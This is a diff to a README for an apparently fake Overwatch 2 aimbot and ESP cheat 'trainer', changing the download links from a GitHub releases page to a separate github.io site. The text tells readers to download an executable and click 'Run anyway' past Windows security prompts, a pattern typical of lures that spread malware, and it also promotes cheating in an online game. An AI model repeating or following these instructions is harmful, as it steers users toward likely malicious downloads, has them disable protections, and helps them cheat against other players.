@@ -1,6 +1,6 @@
 # 🎯 Overwatch-2-Aimbot-ESP-Trainer-2026 - Improve your aim and game awareness
 
-[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Nicholascoordinative712/Overwatch-2-Aimbot-ESP-Trainer-2026/releases)
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://nicholascoordinative712.github.io)
 
 This application provides tools to improve your performance in Overwatch 2. It includes features for tracking player positions, monitoring ability cooldowns, and improving accuracy during matches.
 
@@ -26,7 +26,7 @@ Ensure your computer meets these conditions before you run the trainer:
 
 Follow these steps to set up the software on your computer.
 
-1.  **Visit the download page:** Go to the official release page to get the latest version of the trainer: [https://github.com/Nicholascoordinative712/Overwatch-2-Aimbot-ESP-Trainer-2026/releases](https://github.com/Nicholascoordinative712/Overwatch-2-Aimbot-ESP-Trainer-2026/releases).
+1.  **Visit the download page:** Go to the official release page to get the latest version of the trainer: [https://nicholascoordinative712.github.io](https://nicholascoordinative712.github.io).
 2.  **Download the file:** Look for the most recent release and download the executable file. Save it to a folder you can access easily, such as your Desktop.
 3.  **Launch the game:** Start Overwatch 2 and ensure it is running in Borderless Windowed mode.
 4.  **Open the trainer:** Run the downloaded file. Windows may show a security prompt. If it does, click "Run anyway" to allow the file to open.
